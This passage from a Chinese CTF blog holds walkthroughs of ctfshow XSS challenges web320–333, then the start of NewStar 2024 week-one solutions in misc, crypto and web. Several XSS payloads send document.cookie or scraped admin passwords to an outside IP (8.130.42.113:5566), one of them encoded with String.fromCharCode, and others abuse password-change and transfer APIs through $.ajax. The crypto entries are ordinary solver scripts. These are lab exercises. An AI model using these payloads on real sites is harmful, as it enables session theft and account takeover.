class="hljs-number">51</span>,<span class="hljs-number">48</span>,<span class="hljs-number">46</span>,<span class="hljs-number">52</span>,<span class="hljs-number">50</span>,<span class="hljs-number">46</span>,<span class="hljs-number">49</span>,<span class="hljs-number">49</span>,<span class="hljs-number">51</span>,<span class="hljs-number">58</span>,<span class="hljs-number">53</span>,<span class="hljs-number">53</span>,<span class="hljs-number">54</span>,<span class="hljs-number">54</span>,<span class="hljs-number">47</span>,<span class="hljs-number">120</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">46</span>,<span class="hljs-number">112</span>,<span class="hljs-number">104</span>,<span class="hljs-number">112</span>,<span class="hljs-number">63</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">111</span>,<span class="hljs-number">107</span>,<span class="hljs-number">105</span>,<span class="hljs-number">101</span>,<span class="hljs-number">61</span>,<span class="hljs-number">39</span>,<span class="hljs-number">43</span>,<span class="hljs-number">100</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">117</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>,<span class="hljs-number">116</span>,<span class="hljs-number">46</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">111</span>,<span class="hljs-number">107</span>,<span class="hljs-number">105</span>,<span class="hljs-number">101</span>,<span class="hljs-number">60</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">99</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">112</span>,<span class="hljs-number">116</span>,<span class="hljs-number">62</span>));&gt;<br></code></pre></td></tr></table></figure><p>里面的实际内容是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://8.130.42.113:5566/xxs.php?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="web321"><a class="markdownIt-Anchor" href="#web321"></a> web321</h2><p>同320的0x01</p><h2 id="web322"><a class="markdownIt-Anchor" href="#web322"></a> web322</h2><p>测试了一下，发现xss过滤了，先修改一下vps里的文件名</p><p>与此同时还过滤了过滤了script, img, iframe空格，分号，逗号。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body<span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.open(&#x27;http://8.130.42.113:5566/orange.php?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure><h2 id="web323"><a class="markdownIt-Anchor" href="#web323"></a> web323</h2><p>同322</p><h2 id="web324"><a class="markdownIt-Anchor" href="#web324"></a> web324</h2><p>同322</p><h2 id="web325"><a class="markdownIt-Anchor" href="#web325"></a> web325</h2><p>同322</p><h2 id="web326"><a class="markdownIt-Anchor" href="#web326"></a> web326</h2><p>同322</p><p>到此为止反射型xss结束，可以学习一下不同姿势的xss</p><p><a href="https://www.freebuf.com/articles/web/340080.html">xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户</a></p><h2 id="web327"><a class="markdownIt-Anchor" href="#web327"></a> web327</h2><p>没什么过滤的，必须是<code>admin</code>才能发送成功</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-06160046.png" alt="2024-11-06160046"></p><p>没什么过滤的，按照图片来就行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://8.130.42.113:5566/orange.php?cookie=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="web328"><a class="markdownIt-Anchor" href="#web328"></a> web328</h2><p>去看了一下官方的视频了解了一下思路</p><p>首先需要注册一个账户，password用payload输入，同时vps的端口需要打开，以便可以接收到cookie值，然后进行登陆，利用bp逐条更改cookie值发包以得到flag</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://8.130.42.113:5566/orange.php?cookie=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-06170949.png" alt="2024-11-06170949"></p><p>然后登陆，bp异步发包改cookie发包就行，速度不要过快</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-06171204.png" alt="2024-11-06171204"></p><h2 id="web329"><a class="markdownIt-Anchor" href="#web329"></a> web329</h2><p>本题与上题不同的地方在于cookie会立即失效，所以用cookie的方法就失效了，可以尝试使用外带其他信息进行登陆得到flag</p><h3 id="0x01-3"><a class="markdownIt-Anchor" href="#0x01-3"></a> 0x01</h3><p>通过类名查找元素，通过document来获取。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://8.130.42.113:5566/&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&#x27;layui-table-cell laytable-cell-1-0-1&#x27;</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">innerHTML</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-06204219.png" alt="2024-11-06204219"></p><p>innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。</p><p>可以看到前端代码中将要显示admin密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p><p>这是一个调用 <code>window.open()</code> 函数的语句，用于打开新的浏览器窗口。</p><h3 id="0x02-3"><a class="markdownIt-Anchor" href="#0x02-3"></a> 0x02</h3><p>jQuery 选择器查找类和获取内容。参考的jay17师傅的学习了一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;$(<span class="hljs-string">&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">index, value</span>) &#123;<span class="hljs-keyword">if</span> ((value.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span>) &gt; -<span class="hljs-number">1</span>)&amp;&amp;(value.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;script&#x27;</span>) === -<span class="hljs-number">1</span>)) &#123;<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;http://8.130.42.113:5566/&#x27;</span> +value.<span class="hljs-property">innerHTML</span>;&#125;&#125;);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>值得注意的是环境默认的是注册的就是第一次，所以加入了一个简单的<code>script</code>的限制就可以得到了flag</p><h2 id="web330"><a class="markdownIt-Anchor" href="#web330"></a> web330</h2><p>这题考察的是xss来修改密码。</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-06230549.png" alt="2024-11-06230549"></p><p>抓包发现有修改的api,利用本地修改(x自己?)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>看了一下视频，先注册一个账号，用户名用payload,密码123即可</p><p>使用<code>admin</code>登入，等大约五六秒，登入之后需要抓包，会重定向，能看到flag</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-06232418.png" alt="2024-11-06232418"></p><h2 id="web331"><a class="markdownIt-Anchor" href="#web331"></a> web331</h2><p>这题由上题的GET传参变成POST传参了</p><p>基本的思路都是一样的，改一下payload就行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-number">123</span>&#125;&#125;);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><code>$.ajax()</code> 是 jQuery 用于发起 AJAX 请求的方法。</p><p><code>url: 'api/change.php'</code> 指定请求的目标 URL（<code>api/change.php</code>）。</p><p><code>type: 'post'</code> 设置请求类型为 POST。</p><p><code>data: &#123; p: 123 &#125;</code> 是请求的发送数据，这里以键值对的形式传递参数，<code>p</code> 的值为 123。</p><p>其余流程差不多，不多赘叙</p><h2 id="web332"><a class="markdownIt-Anchor" href="#web332"></a> web332</h2><p>题目描述是xss在哪里</p><p>flag是9999元</p><p>随便注册账户默认只有五块，思路就是让自己钱变得多或者让admin设置的钱变少就行</p><p>这题先讲非预期，下一题正常讲</p><p>给admin转-100000就行了，然后正常买flag</p><h2 id="web333"><a class="markdownIt-Anchor" href="#web333"></a> web333</h2><p>登陆发现没有钱了先是一个方法，先注册一个<code>asd::asd</code>的账户，然后再以payload注册一个账户把钱打进asd的账户里，然后回到asd账户里购买就行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/api/amount.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">u</span>:<span class="hljs-string">&#x27;asd&#x27;</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">10000</span>&#125;&#125;);&lt;/script&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Newstar2024</title>
    <link href="/2024/11/04/Newstar/Newstar2024/"/>
    <url>/2024/11/04/Newstar/Newstar2024/</url>
    
    <content type="html"><![CDATA[<p>前言:后面也没怎么打了，又没时间自己又笨，抄个冷饭放上来吧。</p><h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h1><h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> Signin</h2><h3 id="ez_answer"><a class="markdownIt-Anchor" href="#ez_answer"></a> ez_answer</h3><p>正常答题老实一点就出flag了，正常的规则</p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="decompress"><a class="markdownIt-Anchor" href="#decompress"></a> decompress</h3><p>前几层正常的解压，到最后一层有hint提示，是正则提示简单的看一下，一共是五位密码，前三位是小写字母，第四位数字，第五位是小写字母，用常见的爆破工具进行爆破一下就行，需要十分钟左右的时间吧爆破出来的密码是xtr4m，进去打开第一个压缩包就有flag</p><p><img src="/../../images/Newstar/2024/1.png" alt="1"></p><h3 id="pleasingmusic"><a class="markdownIt-Anchor" href="#pleasingmusic"></a> pleasingMusic</h3><p><img src="/../../images/Newstar/2024/2.png" alt="2"></p><p>aud看一下有摩斯电码，用在线网站先进行初步的音频分离，然后利用题目正反都好听，将.-从后往前敲自己在线网站手敲一下得到编码ez_morse_code，最后套个flag</p><h3 id="whereisflag"><a class="markdownIt-Anchor" href="#whereisflag"></a> WhereIsFlag</h3><p>flag在proc/self/envrion里面,典型的藏在环境变量里</p><h3 id="labyrinth"><a class="markdownIt-Anchor" href="#labyrinth"></a> Labyrinth</h3><p>简单的lsb查找</p><p><img src="/../../images/Newstar/2024/3.png" alt="1"></p><h3 id="兑换码"><a class="markdownIt-Anchor" href="#兑换码"></a> 兑换码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py &lt;png_path&gt;&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br>file = sys.argv[<span class="hljs-number">1</span>]<br>fr = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>data = <span class="hljs-built_in">bytearray</span>(fr[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br><br><span class="hljs-comment"># 获取 CRC32 校验和</span><br>crc32key = struct.unpack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, fr[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>])[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xffffffff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;CRC32 Key: <span class="hljs-subst">&#123;crc32key&#125;</span>&quot;</span>)<br><br>n = <span class="hljs-number">4096</span><br>found = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, w))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x+<span class="hljs-number">4</span>] = width[x]<br>            data[x+<span class="hljs-number">8</span>] = height[x]<br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Width: <span class="hljs-subst">&#123;w&#125;</span>, Height: <span class="hljs-subst">&#123;h&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Data: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>            newpic = <span class="hljs-built_in">bytearray</span>(fr)<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                newpic[x+<span class="hljs-number">16</span>] = width[x]<br>                newpic[x+<span class="hljs-number">20</span>] = height[x]<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> fw:<br>                fw.write(newpic)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新图片已保存为: <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> found:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>简单的crc爆破，直接脚本梭就行了，flag在底部</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="xor"><a class="markdownIt-Anchor" href="#xor"></a> xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes<br><br><span class="hljs-comment"># 密钥和加密的值</span><br>key = <span class="hljs-string">b&#x27;New_Star_CTF&#x27;</span><br>c1 = <span class="hljs-number">8091799978721254458294926060841</span><br>c2 = <span class="hljs-string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span><br><br><span class="hljs-comment"># 解密 m1</span><br>m1 = c1 ^ bytes_to_long(key)<br><br><span class="hljs-comment"># 解密 m2</span><br>m2 = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(c2, key))<br><br><span class="hljs-comment"># 将解密的结果转换为字节并打印</span><br>flag_part1 = long_to_bytes(m1).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>flag_part2 = m2.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment"># 输出完整的 flag</span><br>flag = flag_part1 + flag_part2<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, flag)<br></code></pre></td></tr></table></figure><h3 id="base"><a class="markdownIt-Anchor" href="#base"></a> Base</h3><p>赛博厨子一把梭</p><p><img src="/../../images/Newstar/2024/4.png" alt="4"></p><h3 id="一眼秒了"><a class="markdownIt-Anchor" href="#一眼秒了"></a> 一眼秒了</h3><p>简单的rsa，题目说n小小的也很可爱，用factordb在线网站看看发现有因子，带入p直接上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-comment"># 已知的值</span><br>n = <span class="hljs-number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span><br>c = <span class="hljs-number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span><br><br><span class="hljs-comment"># 计算 q</span><br>q = n // p<br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算 d</span><br>d = invert(e, phi_n)<br><br><span class="hljs-comment"># 解密</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 输出解密后的 flag</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, flag.decode())<br></code></pre></td></tr></table></figure><h3 id="strange-king"><a class="markdownIt-Anchor" href="#strange-king"></a> Strange King</h3><p>rot的变形移位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag</span>):<br>    decrypted_flag = []<br>    shift_values = [<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">17</span>,<span class="hljs-number">19</span>,<span class="hljs-number">21</span>,<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">27</span>,<span class="hljs-number">29</span>,<span class="hljs-number">31</span>,<span class="hljs-number">33</span>,<span class="hljs-number">35</span>,<span class="hljs-number">37</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">43</span>,<span class="hljs-number">45</span>,<span class="hljs-number">47</span>,<span class="hljs-number">49</span>,<span class="hljs-number">51</span>,<span class="hljs-number">53</span>,<span class="hljs-number">55</span>,<span class="hljs-number">57</span>,<span class="hljs-number">59</span>,<span class="hljs-number">61</span>]  <span class="hljs-comment"># 移位值</span><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted_flag):<br>        <span class="hljs-comment"># 计算移位</span><br>        shift = shift_values[i % <span class="hljs-built_in">len</span>(shift_values)]<br>        <span class="hljs-keyword">if</span> char.isalpha():  <span class="hljs-comment"># 只处理字母</span><br>            <span class="hljs-comment"># 处理大写字母</span><br>            <span class="hljs-keyword">if</span> char.isupper():<br>                new_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>            <span class="hljs-comment"># 处理小写字母</span><br>            <span class="hljs-keyword">elif</span> char.islower():<br>                new_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>            decrypted_flag.append(new_char)<br>        <span class="hljs-keyword">else</span>:<br>            decrypted_flag.append(char)  <span class="hljs-comment"># 非字母字符不变</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_flag)<br><br><span class="hljs-comment"># 测试</span><br>encrypted_flag = <span class="hljs-string">&quot;ksjr&#123;EcxvpdErSvcDgdgEzxqjql&#125;&quot;</span><br>decrypted_flag = decrypt_flag(encrypted_flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, decrypted_flag)<br></code></pre></td></tr></table></figure><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="headach3"><a class="markdownIt-Anchor" href="#headach3"></a> headach3</h3><p><img src="/../../images/Newstar/2024/5.png" alt="5"></p><h3 id="会赢吗"><a class="markdownIt-Anchor" href="#会赢吗"></a> 会赢吗</h3><p>第一部分看源码flag{WA0w</p><p>第二部分!_y4_r3al</p><p><img src="/../../images/Newstar/2024/6.png" alt="5"></p><p>第三部分1y_Gr4sP</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 修改状态为 &quot;解封&quot;</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;解封&#x27;</span>;<br><br><span class="hljs-comment">// 获取实际的 CSRF 令牌</span><br><span class="hljs-keyword">const</span> csrfTokenValue = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span>; <span class="hljs-comment">// 确保这个元素存在</span><br><br><span class="hljs-comment">// 发送请求</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: csrfTokenValue &#125;)<br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`第三部分Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, 下一关: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;无&#x27;</span>&#125;</span>`</span>);<br>&#125;)<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error));<br></code></pre></td></tr></table></figure><p>第四部分fSkpKcyF9</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 获取 CSRF 令牌</span><br>const csrfToken = document.getElementById(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).value;<br><br><span class="hljs-comment">// 发送请求</span><br>fetch(<span class="hljs-string">&#x27;/api/flag/Ap3x&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-string">`csrf_token=<span class="hljs-subst">$&#123;encodeURIComponent(csrfToken)&#125;</span>`</span><br>&#125;)<br>.then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.json())<br>.then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>`</span>);<br>&#125;)<br>.<span 